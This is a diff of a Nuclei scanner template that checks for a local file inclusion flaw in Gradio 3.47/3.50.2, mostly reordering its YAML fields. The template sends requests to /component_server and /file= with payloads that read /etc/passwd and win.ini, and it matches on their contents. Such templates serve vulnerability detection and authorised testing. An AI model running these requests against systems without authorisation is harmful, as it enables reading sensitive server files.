@@ -1,5 +1,4 @@
 id: gradio-component-server-lfi
-
 info:
   name: Gradio 3.47/3.50.2 - Local File Inclusion
   author: nvn1729
@@ -12,35 +11,57 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    epss-percentile: 0.36659
     cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+    epss-percentile: 0.36659
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
     max-request: 2
+    product: gradio
+    shodan-query: html:"__gradio_mode__"
     vendor: gradio_project
-  tags: cve,cve2024,intrusive,unauth,gradio,lfi,lfr,vuln
-
-flow: http(1) && http(2)
-
+    verified: true
+  tags: cve,cve2024,gradio,intrusive,lfi,lfr,unauth,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: or
+        dsl:
+          - contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")
+          - contains(tolower(body), "\"method not allowed")
+        internal: true
+        type: dsl
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
       - |
         GET /component_server HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")'
-          - 'contains(tolower(body), "\"method not allowed")'
-        condition: or
+  - attack: clusterbomb
+    extractors:
+      - group: 1
         internal: true
-
-  - raw:
+        name: download_path
+        part: body
+        regex:
+          - '"?([^"]+)'
+        type: regex
+    matchers:
+      - condition: or
+        part: body_2
+        regex:
+          - 'root:.*:0:0:'
+          - \[(font|extension|file)s\]
+        type: regex
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    payloads:
+      fuzz_component_id: helpers/wordlists/numbers.txt
+      path:
+        - /etc/passwd
+        - c:\\windows\\win.ini
+    raw:
       - |
         POST /component_server HTTP/1.1
         Host: {{Hostname}}
@@ -50,34 +71,5 @@ http:
       - |
         GET /file={{download_path}} HTTP/1.1
         Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        part: body
-        name: download_path
-        internal: true
-        group: 1
-        regex:
-          - "\"?([^\"]+)"
-    attack: clusterbomb
-    payloads:
-      fuzz_component_id: helpers/wordlists/numbers.txt
-      path:
-        - /etc/passwd
-        - c:\\windows\\win.ini
-
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body_2
-        regex:
-          - "root:.*:0:0:"
-          - "\\[(font|extension|file)s\\]"
-        condition: or
-
-      - type: status
-        status:
-          - 200
-
+flow: http(1) && http(2)
